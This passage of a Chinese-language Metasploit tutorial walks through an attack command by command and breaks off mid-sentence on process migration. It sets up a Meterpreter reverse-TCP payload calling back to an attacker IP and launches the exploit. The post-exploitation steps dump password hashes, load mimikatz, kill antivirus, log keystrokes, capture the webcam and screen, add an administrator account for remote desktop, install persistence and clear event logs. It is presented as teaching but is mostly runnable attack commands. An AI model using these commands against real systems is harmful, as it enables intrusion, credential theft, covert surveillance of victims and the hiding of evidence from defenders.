class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  payloads  <span class="comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span></span><br></pre></td></tr></table></figure></li><li><p>设置攻击载荷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看模块需要配置的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  options</span><br></pre></td></tr></table></figure></li><li><p>设置攻击载荷参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.100.158   <span class="comment">#设置RHOST，也就是要攻击主机的ip</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.100.132   <span class="comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span></span><br><span class="line"><span class="built_in">set</span> lport 6666              <span class="comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span></span><br></pre></td></tr></table></figure></li><li><p>进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h3><blockquote><p>运行了 <code>exploit</code> 命令之后<br>我们开启了一个 <code>reverse TCP</code> 监听器来监听本地的 <code>6666</code> 端口<br>即我(攻击者)的本地主机地址(LHOST)和端口号(LPORT)<br>运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现</p></blockquote><p>Meterpreter 的命令用法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line"><span class="built_in">bg</span>                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line"><span class="built_in">exit</span>                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line"><span class="built_in">help</span>                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line"><span class="built_in">read</span>                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line"><span class="built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="built_in">cat</span>                           将文件内容读到屏幕上</span><br><span class="line"><span class="built_in">cd</span>                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line"><span class="built_in">cp</span>                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line"><span class="built_in">dir</span>                           列出文件（<span class="built_in">ls</span> 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line"><span class="built_in">ls</span>                            列出文件</span><br><span class="line"><span class="built_in">mkdir</span>                         制作目录</span><br><span class="line"><span class="built_in">mv</span>                            将源移动到目标</span><br><span class="line"><span class="built_in">pwd</span>                           打印工作目录</span><br><span class="line"><span class="built_in">rm</span>                            删除指定文件</span><br><span class="line"><span class="built_in">rmdir</span>                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line"><span class="built_in">kill</span>                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line"><span class="built_in">suspend</span>                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br></pre></td></tr></table></figure><p>输入 <code>shell</code> 即可切换到目标主机的 <code>windows cmd_shell</code> 里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell         <span class="comment">#获取目标主机的cmd_shell权限</span></span><br><span class="line">chcp 65001    <span class="comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span></span><br></pre></td></tr></table></figure><p>要想从目标主机 <code>shell</code> 退出到 <code>meterpreter</code> ，只需输入：<code>exit</code></p><p>从 <code>meterpreter</code> 退出到 <code>MSF框架</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background   <span class="comment">#把我们获得的meterpreter会话挂载到后台运行</span></span><br></pre></td></tr></table></figure><p>查看前面获得的 meterpreter_shell 会话，最前面的数字是会话的 id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions  -l    <span class="comment">#查看获得的meterpreter_shell会话列表</span></span><br></pre></td></tr></table></figure><p>输入 sessions [id 号] 即可进入相应的 meterpreter_shell 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br></pre></td></tr></table></figure><p>输入 <code>shell</code> 即可进入 <code>cmd</code> 类型的控制<br>再输入 <code>powershell</code> ，即可进入 <code>powershell</code> 类型的控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sysinfo             <span class="comment">#查看目标主机系统信息</span></span><br><span class="line">run scraper         <span class="comment">#查看目标主机详细信息</span></span><br><span class="line">run hashdump        <span class="comment">#导出密码的哈希</span></span><br><span class="line">load kiwi           <span class="comment">#加载mimikatz</span></span><br><span class="line">ps                  <span class="comment">#查看目标主机进程信息</span></span><br><span class="line"><span class="built_in">pwd</span>                 <span class="comment">#查看目标当前目录(windows)</span></span><br><span class="line">getlwd              <span class="comment">#查看目标当前目录(Linux)</span></span><br><span class="line">search -f *.jsp -d e:\                <span class="comment">#搜索E盘中所有以.jsp为后缀的文件</span></span><br><span class="line">download  e:\test.txt  /root          <span class="comment">#将目标机的e:\test.txt文件下载到/root目录下</span></span><br><span class="line">upload    /root/test.txt d:\<span class="built_in">test</span>      <span class="comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span></span><br><span class="line">getpid             <span class="comment">#查看当前Meterpreter Shell的进程PID</span></span><br><span class="line">migrate 1384        <span class="comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span></span><br><span class="line">idletime            <span class="comment">#查看主机运行时间</span></span><br><span class="line">getuid              <span class="comment">#查看获取的当前权限</span></span><br><span class="line">getsystem           <span class="comment">#提权,获得的当前用户是administrator才能成功</span></span><br><span class="line">run  killav         <span class="comment">#关闭杀毒软件</span></span><br><span class="line">screenshot          <span class="comment">#截图</span></span><br><span class="line">webcam_list         <span class="comment">#查看目标主机的摄像头</span></span><br><span class="line">webcam_snap         <span class="comment">#拍照</span></span><br><span class="line">webcam_stream       <span class="comment">#开视频</span></span><br><span class="line">execute 参数 -f 可执行文件       <span class="comment">#执行可执行程序</span></span><br><span class="line">run getgui -u test1 -p Abc123456    <span class="comment">#创建test1用户，密码为Abc123456</span></span><br><span class="line">run getgui -e                <span class="comment">#开启远程桌面</span></span><br><span class="line">keyscan_start                <span class="comment">#开启键盘记录功能</span></span><br><span class="line">keyscan_dump                 <span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop                 <span class="comment">#停止键盘记录功能</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  keyboard     <span class="comment">#禁止目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   keyboard     <span class="comment">#允许目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  mouse        <span class="comment">#禁止目标使用鼠标</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   mouse        <span class="comment">#允许目标使用鼠标</span></span><br><span class="line">load                        <span class="comment">#使用扩展库</span></span><br><span class="line">run             <span class="comment">#使用扩展库</span></span><br><span class="line"> </span><br><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389     <span class="comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">clearev                       <span class="comment">#清除日志</span></span><br></pre></td></tr></table></figure><h4 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h4><blockquote><p>该模块主要用于在取得目标主机系统远程控制权后<br>进行一系列的后渗透攻击动作</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate                <span class="comment">#自动进程迁移</span></span><br><span class="line">run post/windows/gather/checkvm                <span class="comment">#查看目标主机是否运行在虚拟机上</span></span><br><span class="line">run post/windows/manage/killav                <span class="comment">#关闭杀毒软件</span></span><br><span class="line">run post/windows/manage/enable_rdp            <span class="comment">#开启远程桌面服务</span></span><br><span class="line">run post/windows/manage/autoroute              <span class="comment">#查看路由信息</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users    <span class="comment">#列举当前登录的用户</span></span><br><span class="line">run post/windows/gather/enum_applications       <span class="comment">#列举应用程序</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin <span class="comment">#抓取自动登录的用户名和密码</span></span><br><span class="line">run post/windows/gather/smart_hashdump               <span class="comment">#dump出所有用户的hash</span></span><br></pre></td></tr></table></figure><p>可输入 <code>sysinfo</code> 查看目标主机的信息</p><h4 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h4><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h4 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h4><p>拿到目标主机的 shell 后第一件事就是关闭掉目标主机的杀毒软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br></pre></td></tr></table></figure><h4 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h4><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper </span><br></pre></td></tr></table></figure><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p><h4 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h4><p>Meterpreter 支持非常多的文件系统命令 (基本跟 Linux 系统命令类似)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>     <span class="comment">#查看当前目录</span></span><br><span class="line"><span class="built_in">cd</span>      <span class="comment">#切换目标目录；</span></span><br><span class="line"><span class="built_in">cat</span>     <span class="comment">#读取文件内容；</span></span><br><span class="line"><span class="built_in">rm</span>      <span class="comment">#删除文件；</span></span><br><span class="line">edit    <span class="comment">#使用vim编辑文件</span></span><br><span class="line"><span class="built_in">ls</span>      <span class="comment">#获取当前目录下的文件；</span></span><br><span class="line"><span class="built_in">mkdir</span>   <span class="comment">#新建目录；</span></span><br><span class="line"><span class="built_in">rmdir</span>   <span class="comment">#删除目录； </span></span><br></pre></td></tr></table></figure><h4 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传 &#x2F; 下载文件"></a>上传 &#x2F; 下载文件</h4><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download  file <span class="comment">#命令可以帮助我们从目标系统中下载文件</span></span><br></pre></td></tr></table></figure><h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload  file  <span class="comment">#命令则能够向目标系统上传文件。</span></span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>有的时候，你可能会发现自己的 <code>Meterpreter</code> 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动<br>比如说，<code>修改注册表</code>、<code>安装后门</code>或<code>导出密码</code>等活动都需要<code>提升用户权限</code><br>而 <code>Meterpreter</code> 给我们提供了一个 <code>getsystem</code> 命令<br>它可以使用多种技术在目标系统中实现提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment">#自动提权为系统权限</span></span><br></pre></td></tr></table></figure><h4 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h4><p><a href="../b034a3f3/">使用 MSF 抓取用户密码</a></p><h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p>先查看目标主机安装了哪些应用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications  <span class="comment">#查看目标主机安装了哪些应用</span></span><br></pre></td></tr></table></figure><p>在 <code>meterpreter_shell</code> 命令行执行目标系统中的应用程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#execute命令用法：</span></span><br><span class="line">execute [参数] -f 指定的可执行文件</span><br><span class="line"></span><br><span class="line">-f：指定可执行文件</span><br><span class="line">-H：创建一个隐藏进程</span><br><span class="line">-a：传递给命令的参数</span><br><span class="line">-i：跟进程进行交互</span><br><span class="line">-m：从内存中执行</span><br><span class="line">-t：使用当前伪造的线程令牌运行进程</span><br><span class="line">-s：在给定会话中执行进程</span><br></pre></td></tr></table></figure><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><p>截图目标主机屏幕，图片保存到 <code>/root/Desktop/</code> 下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot <span class="comment">#截图目标主机屏幕</span></span><br></pre></td></tr></table></figure><h4 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h4><p>先查看目标主机有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users  <span class="comment">#查看目标主机有用户</span></span><br></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法一</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u 用户 -p 密码</span><br><span class="line">-u: 指定用户</span><br><span class="line">-p: 指定密码</span><br></pre></td></tr></table></figure><blockquote><p>这个命令会创建用户<br>并把他添加到 <code>Administrators</code> 组中<br>这样该用户就拥有远程桌面的权限了</p></blockquote><p>在目标系统中创建一个新的用户账号的方法二</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enable_rdp脚本:</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test2 PASSWORD=Abc123456  <span class="comment">#添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp                                    <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662            <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure><h4 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h4><p>当我们新添加的用户已经拥有远程桌面之后<br>我们就可以使用这个账号凭证来开启远程桌面会话了</p><p>首先，我们需要确保目标 Windows 设备开启了远程桌面功能（需要开启多个服务）<br>我们输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>命令可以开启远程桌面</p><p>在开启远程桌面会话之前<br>我们还需要使用 <code>idletime</code> 命令检查远程用户的空闲时长</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idletime <span class="comment">#检查远程用户的空闲时长</span></span><br></pre></td></tr></table></figure><p>开启远程桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>Meterpreter 还可以在目标设备上实现键盘记录功能<br>键盘记录主要涉及以下三种命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  <span class="comment">#开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；</span></span><br><span class="line">keyscan_dump   <span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop   <span class="comment">#停止键盘记录功能</span></span><br></pre></td></tr></table></figure><blockquote><p>在使用键盘记录功能时<br>通常需要跟目标进程进行绑定<br>然后获取该进程下的键盘记录</p></blockquote><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><p>Meterpreter 既可以单独运行<br>也可以与其他进程进行绑定<br>因此，我们可以让 <code>Meterpreter</code> 与类似 <code>explorer.exe</code> 这样的进程进行绑定<br>并以此来实现持久化</p><p>在下面的例子中<br>我们会将 <code>Meterpreter</code> 跟 <code>winlogon.exe</code> 